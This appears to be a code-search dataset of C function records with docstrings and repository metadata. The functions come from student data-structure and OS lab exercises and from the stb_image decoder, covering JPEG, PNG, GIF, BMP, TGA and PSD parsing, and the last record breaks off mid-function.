{"docstring": "// Generate all the partitions of the set...\n", "func_signal": "void partitons (BOOL curr[N], int k, int n)", "code": "{\n\n\tint i, j;\n\n\tint ic = 0, ec = 0;\n\tfor (i = 0; i < n; ++i) {\n\t\tif (curr[i]) ic += 1;\n\t\telse ec += 1;\n\t}\n\n\t// Only print the last decent\n\tif (k == n-1) {\n\n\t\tif (ic > 0 && ec > 0) {\n\n\t\t\tif (checkSum(curr)) {\n\n\t\t\t\tfor (i = 0; i < n; ++i) {\n\t\t\t\t\tif (curr[i])\n\t\t\t\t\t\tprintf(\"%d \", arr[i]);\n\t\t\t\t}\n\t\t\t\tprintf(\"  ---------   \");\n\t\t\t\tfor (i = 0; i < n; ++i) {\n\t\t\t\t\tif (!curr[i])\n\t\t\t\t\t\tprintf(\"%d \", arr[i]);\n\t\t\t\t}\n\t\t\t\tprintf(\"\\n\");\n\n\t\t\t}\n\n\t\t}\n\n\t\treturn;\n\t}\n\n\tBOOL incl[N];\n\tBOOL excl[N];\n\tfor (i = 0; i < N; ++i) {\n\t\tincl[i] = curr[i];\n\t\texcl[i] = curr[i];\n\t}\n\tincl[k] = YES;\n\texcl[k] = NO;\n\n\t// Recurse by including current and one by excluding current.\n\tpartitons(incl, k+1, n);\n\tpartitons(excl, k+1, n);\n}", "path": "ALG Lab\\Brute Forcing\\Subset Sum\\subsetsum.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// First come first serve based calculation\n", "func_signal": "void calculate ()", "code": "{\n\tint i;\n\t(*datas)->wt = 0;\n\tatat = (*datas)->tat = (*datas)->bt;\n\tint btt = (*datas)->bt;\n\tfor (i = 1; i < n; ++i) {\n\t\tDATA_p_t datai = *(datas + i);\n\t\tdatai->wt = btt - datai->at;\n\t\tbtt += datai->bt;\n\t\tawt += datai->wt;\n\t\tdatai->tat = datai->wt + datai->bt;\n\t\tatat += datai->tat;\n\t}\n\tatat /= n;\n\tawt /= n;\n}", "path": "OS Lab\\CPU Scheduling\\priority\\mqpriority.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Insert a arbritary token to the token DLL\n", "func_signal": "tnode_p_t insert_token (tnode_p_t *head, char *token)", "code": "{\n\tif (*head == NULL) {\n\t\t*head = init_tnode(token);\n\t\treturn *head;\n\t}\n\ttnode_p_t root = *head;\n\ttnode_p_t temp = init_tnode(token);\n\ttemp->next = root;\n\ttemp->prev = root->prev;\n\troot->prev = temp;\n\troot->prev->next = temp;\n\treturn temp;\n}", "path": "CD Lab\\C like Parser 3\\src\\util.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// An iterative function to do postorder traversal of a given binary tree\n", "func_signal": "void postOrderIterative(struct Node* root)", "code": "{\n    // Check for empty tree\n    if (root == NULL)\n        return;\n     \n    struct Stack* stack = createStack(MAX_SIZE);\n    do\n    {\n        // Move to leftmost node\n        while (root)\n        {\n            // Push root's right child and then root to stack.\n            if (root->right)\n                push(stack, root->right);\n            push(stack, root);\n \n            // Set root as root's left child  \n            root = root->left;\n        }\n \n        // Pop an item from stack and set it as root    \n        root = pop(stack);\n \n        // If the popped item has a right child and the right child is not\n        // processed yet, then make sure right child is processed before root\n        if (root->right && checkTop(stack) == root->right)\n        {\n            pop(stack);  // remove right child from stack\n            push(stack, root);  // push root back to stack\n            root = root->right; // change root so that the right \n                                // child is processed next\n        }\n        else  // Else print root's data and set root as NULL\n        {\n            printf(\"%d \", root->data);\n            root = NULL;\n        }\n    } while (!isEmpty(stack));\n}", "path": "DS Lab\\DS Lab programs by week\\Week 11\\PostorderIter1stack.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// ----------------------------\n", "func_signal": "void parse_input (char *inname)", "code": "{\n\n\tstrcpy(buffer, inname);\n\n\t// Make a temp copy of the string\n\tchar *cp = (char *)malloc(BUFFER_SIZE * sizeof(char));\n\tstrcpy(cp, buffer);\n\n\tchar *token = (char *)malloc(256 * sizeof(char));\n\n\tdo {\n\t\t// strsep - extract token from string, returns null if token is not found.\n\t\ttoken = strsep(&cp, delimiters);\n\t\tif (token != NULL && strlen(token) > 0) {\n\t\t\tstrcpy(input[k++], token);\n\t\t\t// printf(\"%s || \", input[k-1]);\n\t\t}\n\n\t} while (token != NULL);\n\tstrcpy(input[k++], \"$\");\n\n\tE();\n\n}", "path": "CD Lab\\Simple parsers\\two.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "/**\n *\tDeletions are done from the front end.\n *\n *\tCheck for underflow, return underflow value if true.\n *\n *\tGet the item at the front end.\n *\n *\tIf front == rear, i.e. there's only one element, set both to -1.\n *\n *\tIf front is at the end of the array, set front to 0.\n *\n *\tElse increment front end.\n *\n *\tDecrement the capacity.\n */\n", "func_signal": "int delete (CQUEUE_p_t queue)", "code": "{\n\tif (isEmptyQueue(*queue)) {\n\t\tprintf(\"\\nQueue Underflow!\\n\\n\");\n\t\treturn UNDERFLOW_INT;\n\t}\n\t\n\tint item = queue->arr[queue->front];\n\t\n\tif (queue->front == queue->rear) {\n\t\tqueue->front = -1;\n\t\tqueue->rear = -1;\n\t}\n\telse if (queue->front == queue->maxSize - 1)\n\t\tqueue->front = 0;\n\telse\n\t\tqueue->front += 1;\n\t\n\tqueue->capacity -= 1;\n\t\n\treturn item;\n}", "path": "DS Lab\\Queue\\CQExpand.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Transversals\n", "func_signal": "void inOrder (TNODE_p_t root)", "code": "{\n\t\n\tTNODE_p_t current = root;\n\t\n\tSTACK_t stack;\n\tstack.tos = -1;\n\t\n\tif (current == NULL)\n\t\treturn;\n \n\twhile (YES) {\n\t\t\n\t\tif (current !=  NULL) {\n\t\t\tpush(&stack, current);\n\t\t\tcurrent = current->left;\n\t\t}\n\t\t\n\t\telse {\n\t\t\tif (stack.tos > -1) {\n\t\t\t\tcurrent = pop(&stack);\n\t\t\t\tprintf(\" %d\", current->data);\n\t\t\t\tcurrent = current->right;\n\t\t\t}\n\t\t\telse\n\t\t\t\tbreak;\n\t\t}\n\t}\n\t\n}", "path": "DS Lab\\Binary Trees\\BinaryTreeIter.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "/**\n *\tCheck for overflow, if full, prepare to increase the size of the queue.\n *\n *\tIncrease the size of the queue using realloc.\n *\n *\tWe need to reset the queue only if the queue is full and front is greater than rear (i.e. the queue is circularly arranged)\n *\n *\tGet the current queue elements and put them in 'currentElements' array.\n *\n *\tSet front to 0 and rear to capacity - 1\n *\n *\tPut elements back in the queue, and increase the max size.\n */\n", "func_signal": "BOOL isFullQueue (CQUEUE_p_t queue)", "code": "{\n\t// Check for overflow\n\t\n\tif ((queue->front == queue->rear + 1) || (queue->front == 0 && queue->rear == queue->maxSize - 1)) {\n\t\t\n\t\t// Use realloc like this. It may or may mot work.\n\t\tqueue->arr = (int *)realloc(queue->arr, queue->maxSize * 2 * sizeof(int));\n\t\t\n\t\tif (queue->front > queue->rear) {\n\t\t\tint i, k;\n\t\t\tint currentElements[queue->capacity + 1];\n\t\t\t\n\t\t\tfor (i = queue->front, k = 0; i < queue->capacity; ++i)\n\t\t\t\tcurrentElements[k++] = queue->arr[i];\n\t\t\tfor (i = 0; i <= queue->rear; ++i)\n\t\t\t\tcurrentElements[k++] = queue->arr[i];\n\t\t\t\n\t\t\tqueue->front = 0;\n\t\t\tqueue->rear = queue->capacity - 1;\n\t\t\t\n\t\t\tfor (i = queue->rear; i >= 0; --i)\n\t\t\t\tqueue->arr[i] = currentElements[--k];\n\t\t}\n\t\t\n\t\tqueue->maxSize *= 2;\n\t\t\n\t\treturn YES;\n\t}\n\treturn NO;\n}", "path": "DS Lab\\Queue\\CQExpand.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Queue methods\n", "func_signal": "BOOL isFullQueue (CQUEUE_t queue)", "code": "{\n\tif ((queue.rear + 1)%SIZE == queue.front)\n\t\treturn YES;\n\treturn NO;\n}", "path": "DS Lab\\Queue\\CQStrings.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Tree creation\n", "func_signal": "TNODE_p_t createLeaf(char data)", "code": "{\n\tTNODE_p_t leaf = (TNODE_p_t)malloc(sizeof(TNODE_t));\n\tleaf->right = NULL;\n\tleaf->left = NULL;\n\tleaf->data = data;\n\treturn leaf;\n}", "path": "DS Lab\\Binary Trees\\BinaryTreeIter.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// BASIC OPERATIONS OF STACK\n", "func_signal": "int isFull(struct Stack* stack)", "code": "{  return stack->top - 1 == stack->size; }\n \nint isEmpty(struct Stack* stack)\n{  return stack->top == -1; }\n \nvoid push(struct Stack* stack, struct Node* node)\n{\n    if (isFull(stack))\n        return;\n    stack->array[++stack->top] = node;\n}", "path": "DS Lab\\DS Lab programs by week\\Week 11\\PostorderIter1stack.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Queue methods\n", "func_signal": "BOOL isFullQueue (CQUEUE_t queue, int qno)", "code": "{\n\tif (qno == 1 && queue.cap1 == SIZE/2)\n\t\treturn YES;\n\telse if (qno == 2 && queue.cap2 == SIZE/2)\n\t\treturn YES;\n\treturn NO;\n}", "path": "DS Lab\\Queue\\TwoCQs.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// A utility function to create a new tree node\n", "func_signal": "struct Node* newNode(int data)", "code": "{\n    struct Node* node = (struct Node*) malloc(sizeof(struct Node));\n    node->data = data;\n    node->left = node->right = NULL;\n    return node;\n}", "path": "DS Lab\\DS Lab programs by week\\Week 11\\PostorderIter1stack.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Driver program to test above functions\n", "func_signal": "int main()", "code": "{\n    // Let us construct the tree shown in above figure\n    struct Node* root = NULL;\n    root = newNode(1);\n    root->left = newNode(2);\n    root->right = newNode(3);\n    root->left->left = newNode(4);\n    root->left->right = newNode(5);\n    root->right->left = newNode(6);\n    root->right->right = newNode(7);\n \n    postOrderIterative(root);\n \n    return 0;\n}", "path": "DS Lab\\DS Lab programs by week\\Week 11\\PostorderIter1stack.c", "repo_name": "mitcse/CSE-Labs", "stars": 134, "license": "None", "language": "c", "size": 6835}
{"docstring": "// Microsoft/Windows BMP image\n", "func_signal": "static int bmp_test(stbi *s)", "code": "{\n   int sz;\n   if (get8(s) != 'B') return 0;\n   if (get8(s) != 'M') return 0;\n   get32le(s); // discard filesize\n   get16le(s); // discard reserved\n   get16le(s); // discard reserved\n   get32le(s); // discard data offset\n   sz = get32le(s);\n   if (sz == 12 || sz == 40 || sz == 56 || sz == 108) return 1;\n   return 0;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// after a restart interval, reset the entropy decoder and\n// the dc prediction\n", "func_signal": "static void reset(jpeg *j)", "code": "{\n   j->code_bits = 0;\n   j->code_buffer = 0;\n   j->nomore = 0;\n   j->img_comp[0].dc_pred = j->img_comp[1].dc_pred = j->img_comp[2].dc_pred = 0;\n   j->marker = MARKER_none;\n   j->todo = j->restart_interval ? j->restart_interval : 0x7fffffff;\n   // no more than 1<<31 MCUs if no restart_interal? that's plenty safe,\n   // since we don't even allow 1<<30 pixels\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// a quick hack to only allow decoding some of a PNG... I should implement real streaming support instead\n", "func_signal": "static int parse_zlib(zbuf *a, int parse_header)", "code": "{\n   int final, type;\n   if (parse_header)\n      if (!parse_zlib_header(a)) return 0;\n   a->num_bits = 0;\n   a->code_buffer = 0;\n   do {\n      final = zreceive(a,1);\n      type = zreceive(a,2);\n      if (type == 0) {\n         if (!parse_uncompressed_block(a)) return 0;\n      } else if (type == 3) {\n         return 0;\n      } else {\n         if (type == 1) {\n            // use fixed code lengths\n            if (!default_distance[31]) init_defaults();\n            if (!zbuild_huffman(&a->z_length  , default_length  , 288)) return 0;\n            if (!zbuild_huffman(&a->z_distance, default_distance,  32)) return 0;\n         } else {\n            if (!compute_huffman_codes(a)) return 0;\n         }\n         if (!parse_huffman_block(a)) return 0;\n      }\n      if (stbi_png_partial && a->zout - a->zout_start > 65536)\n         break;\n   } while (!final);\n   return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// initialize a memory-decode context\n", "func_signal": "static void start_mem(stbi *s, uint8 const *buffer, int len)", "code": "{\n   s->io.read = NULL;\n   s->read_from_callbacks = 0;\n   s->img_buffer = s->img_buffer_original = (uint8 *) buffer;\n   s->img_buffer_end = (uint8 *) buffer+len;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// decode one 64-entry block--\n", "func_signal": "static int decode_block(jpeg *j, short data[64], huffman *hdc, huffman *hac, int b)", "code": "{\n   int diff,dc,k;\n   int t = decode(j, hdc);\n   if (t < 0) return e(\"bad huffman code\",\"Corrupt JPEG\");\n\n   // 0 all the ac values now so we can do it 32-bits at a time\n   memset(data,0,64*sizeof(data[0]));\n\n   diff = t ? extend_receive(j, t) : 0;\n   dc = j->img_comp[b].dc_pred + diff;\n   j->img_comp[b].dc_pred = dc;\n   data[0] = (short) dc;\n\n   // decode AC components, see JPEG spec\n   k = 1;\n   do {\n      int r,s;\n      int rs = decode(j, hac);\n      if (rs < 0) return e(\"bad huffman code\",\"Corrupt JPEG\");\n      s = rs & 15;\n      r = rs >> 4;\n      if (s == 0) {\n         if (rs != 0xf0) break; // end block\n         k += 16;\n      } else {\n         k += r;\n         // decode into unzigzag'd location\n         data[dezigzag[k++]] = (short) extend_receive(j,s);\n      }\n   } while (k < 64);\n   return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// these is-hdr-or-not is defined independent of whether STBI_NO_HDR is\n// defined, for API simplicity; if STBI_NO_HDR is defined, it always\n// reports false!\n", "func_signal": "int stbi_is_hdr_from_memory(stbi_uc const *buffer, int len)", "code": "{\n   #ifndef STBI_NO_HDR\n   stbi s;\n   start_mem(&s,buffer,len);\n   return stbi_hdr_test(&s);\n   #else\n   STBI_NOTUSED(buffer);\n   STBI_NOTUSED(len);\n   return 0;\n   #endif\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// combined JPEG 'receive' and JPEG 'extend', since baseline\n// always extends everything it receives.\n", "func_signal": "stbi_inline static int extend_receive(jpeg *j, int n)", "code": "{\n   unsigned int m = 1 << (n-1);\n   unsigned int k;\n   if (j->code_bits < n) grow_buffer_unsafe(j);\n\n   #if 1\n   k = stbi_lrot(j->code_buffer, n);\n   j->code_buffer = k & ~bmask[n];\n   k &= bmask[n];\n   j->code_bits -= n;\n   #else\n   k = (j->code_buffer >> (32 - n)) & bmask[n];\n   j->code_bits -= n;\n   j->code_buffer <<= n;\n   #endif\n   // the following test is probably a random branch that won't\n   // predict well. I tried to table accelerate it but failed.\n   // maybe it's compiling as a conditional move?\n   if (k < m)\n      return (-1 << n) + k + 1;\n   else\n      return k;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// if there's a pending marker from the entropy stream, return that\n// otherwise, fetch from the stream and get a marker. if there's no\n// marker, return 0xff, which is never a valid marker value\n", "func_signal": "static uint8 get_marker(jpeg *j)", "code": "{\n   uint8 x;\n   if (j->marker != MARKER_none) { x = j->marker; j->marker = MARKER_none; return x; }\n   x = get8u(j->s);\n   if (x != 0xff) return MARKER_none;\n   while (x == 0xff)\n      x = get8u(j->s);\n   return x;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// this function is designed to support animated gifs, although stb_image doesn't support it\n", "func_signal": "static uint8 *stbi_gif_load_next(stbi *s, stbi_gif *g, int *comp, int req_comp)", "code": "{\n   int i;\n   uint8 *old_out = 0;\n\n   if (g->out == 0) {\n      if (!stbi_gif_header(s, g, comp,0))     return 0; // failure_reason set by stbi_gif_header\n      g->out = (uint8 *) malloc(4 * g->w * g->h);\n      if (g->out == 0)                      return epuc(\"outofmem\", \"Out of memory\");\n      stbi_fill_gif_background(g);\n   } else {\n      // animated-gif-only path\n      if (((g->eflags & 0x1C) >> 2) == 3) {\n         old_out = g->out;\n         g->out = (uint8 *) malloc(4 * g->w * g->h);\n         if (g->out == 0)                   return epuc(\"outofmem\", \"Out of memory\");\n         memcpy(g->out, old_out, g->w*g->h*4);\n      }\n   }\n    \n   for (;;) {\n      switch (get8(s)) {\n         case 0x2C: /* Image Descriptor */\n         {\n            int32 x, y, w, h;\n            uint8 *o;\n\n            x = get16le(s);\n            y = get16le(s);\n            w = get16le(s);\n            h = get16le(s);\n            if (((x + w) > (g->w)) || ((y + h) > (g->h)))\n               return epuc(\"bad Image Descriptor\", \"Corrupt GIF\");\n\n            g->line_size = g->w * 4;\n            g->start_x = x * 4;\n            g->start_y = y * g->line_size;\n            g->max_x   = g->start_x + w * 4;\n            g->max_y   = g->start_y + h * g->line_size;\n            g->cur_x   = g->start_x;\n            g->cur_y   = g->start_y;\n\n            g->lflags = get8(s);\n\n            if (g->lflags & 0x40) {\n               g->step = 8 * g->line_size; // first interlaced spacing\n               g->parse = 3;\n            } else {\n               g->step = g->line_size;\n               g->parse = 0;\n            }\n\n            if (g->lflags & 0x80) {\n               stbi_gif_parse_colortable(s,g->lpal, 2 << (g->lflags & 7), g->eflags & 0x01 ? g->transparent : -1);\n               g->color_table = (uint8 *) g->lpal;       \n            } else if (g->flags & 0x80) {\n               for (i=0; i < 256; ++i)  // @OPTIMIZE: reset only the previous transparent\n                  g->pal[i][3] = 255; \n               if (g->transparent >= 0 && (g->eflags & 0x01))\n                  g->pal[g->transparent][3] = 0;\n               g->color_table = (uint8 *) g->pal;\n            } else\n               return epuc(\"missing color table\", \"Corrupt GIF\");\n   \n            o = stbi_process_gif_raster(s, g);\n            if (o == NULL) return NULL;\n\n            if (req_comp && req_comp != 4)\n               o = convert_format(o, 4, req_comp, g->w, g->h);\n            return o;\n         }\n\n         case 0x21: // Comment Extension.\n         {\n            int len;\n            if (get8(s) == 0xF9) { // Graphic Control Extension.\n               len = get8(s);\n               if (len == 4) {\n                  g->eflags = get8(s);\n                  get16le(s); // delay\n                  g->transparent = get8(s);\n               } else {\n                  skip(s, len);\n                  break;\n               }\n            }\n            while ((len = get8(s)) != 0)\n               skip(s, len);\n            break;\n         }\n\n         case 0x3B: // gif stream termination code\n            return (uint8 *) 1;\n\n         default:\n            return epuc(\"unknown code\", \"Corrupt GIF\");\n      }\n   }\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// initialize a callback-based context\n", "func_signal": "static void start_callbacks(stbi *s, stbi_io_callbacks *c, void *user)", "code": "{\n   s->io = *c;\n   s->io_user_data = user;\n   s->buflen = sizeof(s->buffer_start);\n   s->read_from_callbacks = 1;\n   s->img_buffer_original = s->buffer_start;\n   refill_buffer(s);\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// Targa Truevision - TGA\n// by Jonathan Dummer\n", "func_signal": "static int tga_info(stbi *s, int *x, int *y, int *comp)", "code": "{\n    int tga_w, tga_h, tga_comp;\n    int sz;\n    get8u(s);                   // discard Offset\n    sz = get8u(s);              // color type\n    if( sz > 1 ) {\n        stbi_rewind(s);\n        return 0;      // only RGB or indexed allowed\n    }\n    sz = get8u(s);              // image type\n    // only RGB or grey allowed, +/- RLE\n    if ((sz != 1) && (sz != 2) && (sz != 3) && (sz != 9) && (sz != 10) && (sz != 11)) return 0;\n    skip(s,9);\n    tga_w = get16le(s);\n    if( tga_w < 1 ) {\n        stbi_rewind(s);\n        return 0;   // test width\n    }\n    tga_h = get16le(s);\n    if( tga_h < 1 ) {\n        stbi_rewind(s);\n        return 0;   // test height\n    }\n    sz = get8(s);               // bits per pixel\n    // only RGB or RGBA or grey allowed\n    if ((sz != 8) && (sz != 16) && (sz != 24) && (sz != 32)) {\n        stbi_rewind(s);\n        return 0;\n    }\n    tga_comp = sz;\n    if (x) *x = tga_w;\n    if (y) *y = tga_h;\n    if (comp) *comp = tga_comp / 8;\n    return 1;                   // seems to have passed everything\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// *************************************************************************************************\n// Photoshop PSD loader -- PD by Thatcher Ulrich, integration by Nicolas Schulz, tweaked by STB\n", "func_signal": "static int psd_test(stbi *s)", "code": "{\n   if (get32(s) != 0x38425053) return 0;   // \"8BPS\"\n   else return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// 0.38 seconds on 3*anemones.jpg   (0.25 with processor = Pro)\n// VC6 without processor=Pro is generating multiple LEAs per multiply!\n", "func_signal": "static void YCbCr_to_RGB_row(uint8 *out, const uint8 *y, const uint8 *pcb, const uint8 *pcr, int count, int step)", "code": "{\n   int i;\n   for (i=0; i < count; ++i) {\n      int y_fixed = (y[i] << 16) + 32768; // rounding\n      int r,g,b;\n      int cr = pcr[i] - 128;\n      int cb = pcb[i] - 128;\n      r = y_fixed + cr*float2fixed(1.40200f);\n      g = y_fixed - cr*float2fixed(0.71414f) - cb*float2fixed(0.34414f);\n      b = y_fixed                            + cb*float2fixed(1.77200f);\n      r >>= 16;\n      g >>= 16;\n      b >>= 16;\n      if ((unsigned) r > 255) { if (r < 0) r = 0; else r = 255; }\n      if ((unsigned) g > 255) { if (g < 0) g = 0; else g = 255; }\n      if ((unsigned) b > 255) { if (b < 0) b = 0; else b = 255; }\n      out[0] = (uint8)r;\n      out[1] = (uint8)g;\n      out[2] = (uint8)b;\n      out[3] = 255;\n      out += step;\n   }\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// STBI_NO_HDR\n", "func_signal": "static int stbi_bmp_info(stbi *s, int *x, int *y, int *comp)", "code": "{\n   int hsz;\n   if (get8(s) != 'B' || get8(s) != 'M') {\n       stbi_rewind( s );\n       return 0;\n   }\n   skip(s,12);\n   hsz = get32le(s);\n   if (hsz != 12 && hsz != 40 && hsz != 56 && hsz != 108) {\n       stbi_rewind( s );\n       return 0;\n   }\n   if (hsz == 12) {\n      *x = get16le(s);\n      *y = get16le(s);\n   } else {\n      *x = get32le(s);\n      *y = get32le(s);\n   }\n   if (get16le(s) != 1) {\n       stbi_rewind( s );\n       return 0;\n   }\n   *comp = get16le(s) / 8;\n   return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// !STBI_NO_STDIO\n", "func_signal": "extern int      stbi_is_hdr_from_callbacks(stbi_io_callbacks const *clbk, void *user)", "code": "{\n   #ifndef STBI_NO_HDR\n   stbi s;\n   start_callbacks(&s, (stbi_io_callbacks *) clbk, user);\n   return stbi_hdr_test(&s);\n   #else\n   return 0;\n   #endif\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// !STBI_NO_STDIO\n", "func_signal": "int stbi_info_from_memory(stbi_uc const *buffer, int len, int *x, int *y, int *comp)", "code": "{\n   stbi s;\n   start_mem(&s,buffer,len);\n   return stbi_info_main(&s,x,y,comp);\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "//!STBI_NO_STDIO\n", "func_signal": "unsigned char *stbi_load_from_memory(stbi_uc const *buffer, int len, int *x, int *y, int *comp, int req_comp)", "code": "{\n   stbi s;\n   start_mem(&s,buffer,len);\n   return stbi_load_main(&s,x,y,comp,req_comp);\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// after we see SOS\n", "func_signal": "static int process_scan_header(jpeg *z)", "code": "{\n   int i;\n   int Ls = get16(z->s);\n   z->scan_n = get8(z->s);\n   if (z->scan_n < 1 || z->scan_n > 4 || z->scan_n > (int) z->s->img_n) return e(\"bad SOS component count\",\"Corrupt JPEG\");\n   if (Ls != 6+2*z->scan_n) return e(\"bad SOS len\",\"Corrupt JPEG\");\n   for (i=0; i < z->scan_n; ++i) {\n      int id = get8(z->s), which;\n      int q = get8(z->s);\n      for (which = 0; which < z->s->img_n; ++which)\n         if (z->img_comp[which].id == id)\n            break;\n      if (which == z->s->img_n) return 0;\n      z->img_comp[which].hd = q >> 4;   if (z->img_comp[which].hd > 3) return e(\"bad DC huff\",\"Corrupt JPEG\");\n      z->img_comp[which].ha = q & 15;   if (z->img_comp[which].ha > 3) return e(\"bad AC huff\",\"Corrupt JPEG\");\n      z->order[i] = which;\n   }\n   if (get8(z->s) != 0) return e(\"bad SOS\",\"Corrupt JPEG\");\n   get8(z->s); // should be 63, but might be 0\n   if (get8(z->s) != 0) return e(\"bad SOS\",\"Corrupt JPEG\");\n\n   return 1;\n}", "path": "src\\stb_image.c", "repo_name": "Senscape/Dagon", "stars": 201, "license": "mpl-2.0", "language": "c", "size": 31663}
{"docstring": "// create the png data from post-deflated data\n", "func_signal": "static int create_png_image_raw(png *a, uint8 *raw, uint32 raw_len, int out_n, uint32 x, uint32 y)", "code": "{\n   stbi *s = a->s;\n   uint32 i,j,stride = x*out_n;\n   int k;\n   int img_n = s->img_n; // copy it into a local for later\n   assert(out_n == s->img_n || out_n == s->img_n+1);\n   if (stbi_png_partial) y = 1;\n   a->out = (uint8 *) malloc(x * y * out_n);\n   if (!a->out) return e(\"outofmem\", \"Out of memory\");\n   if (!stbi_png_partial) {\n      if (s->img_x == x && s->img_y == y) {\n         if (raw_len != (img_n * x + 1) * y) return e(\"not enough pixels\",\"Corrupt PNG\");\n      } else { // interlaced:\n         if (raw_len < (img_n * x + 1) * y) return e(\"not enough pixels\",\"Corrupt PNG\");\n      }\n   }\n   for (j=0; j < y; ++j) {\n      uint8 *cur = a->out + stride*j;\n      uint8 *prior = cur - stride;\n      int filter = *raw++;\n      if (filter > 4) return e(\"invalid filter\",\"Corrupt PNG\");\n      // if first row, use special filter that doesn't sample previous row\n      if (j == 0) filter = first_row_filter[filter];\n      // handle first pixel explicitly\n      for (k=0; k < img_n; ++k) {\n         switch (filter) {\n            case F_none       : cur[k] = raw[k]; break;\n            case F_sub        : cur[k] = raw[k]; break;\n            case F_up         : cur[k] = raw[k] + prior[k]; break;\n            case F_avg        : cur[k] = raw[k] + (prior[k]>>1); break;\n            case F_paeth      : cur[k] = (uint8) (raw[k] + paeth(0,prior[k],0)); break;\n            case F_avg_first  : cur[k] = raw[k]; break;\n            case F_paeth_first: cur[k] = raw[k]; break;\n         }\n      }\n      if (img_n != out_n) cur[img_n] = 255;\n      raw += img_n;\n      cur += out_n;\n      prior += out_n;\n      // this is a little gross, so that we don't switch per-pixel or per-component\n      if (img_n == out_n) {\n         #define CASE(f) \\\n             case f:     \\\n                for (i=x-1; i >= 1; --i, raw+=img_n,cur+=img_n,prior+=img_n) \\\n                   for (k=0; k < img_n; ++k)\n         switch (filter) {\n            CASE(F_none)  cur[k] = raw[k]; break;\n            CASE(F_sub)   cur[k] = raw[k] + cur[k-img_n]; break;\n            CASE(F_up)    cur[k] = raw[k] + prior[k]; break;\n            CASE(F_avg)   cur[k] = raw[k] + ((prior[k] + cur[k-img_n])>>1); break;\n            CASE(F_paeth)  cur[k] = (uint8) (raw[k] + paeth(cur[k-img_n],prior[k],prior[k-img_n])); break;\n            CASE(F_avg_first)    cur[k] = raw[k] + (cur[k-img_n] >> 1); break;\n            CASE(F_paeth_first)  cur[k] = (uint8) (raw[k] + paeth(cur[k-img_n],0,0)); break;\n         }\n         #undef CASE\n      } else {\n         assert(img_n+1 == out_n);\n         #define CASE(f) \\\n             case f:     \\\n                for (i=x-1; i >= 1; --i, cur[img_n]=255,raw+=img_n,cur+=out_n,prior+=out_n) \\\n                   for (k=0; k < img_n; ++k)\n         switch (filter) {\n            CASE(F_none)  cur[k] = raw[k]; break;\n            CASE(F_sub)   cur[k] = raw[k] + cur[k-out_n]; break;\n            CASE(F_up)    cur[k] = raw[k] + prior[k]; break;\n            CASE(F_avg)   cur[k] = raw[k] + ((prior[k] + cur[k-out_n])>>1); break;\n            CASE(F_paeth)  cur[k] = (uint8) (raw[k] + paeth(cur[k-out_n],prior[k],prior[k-out_n])); break;\n            CASE(F_avg_first)    cur[k] = raw[k] + 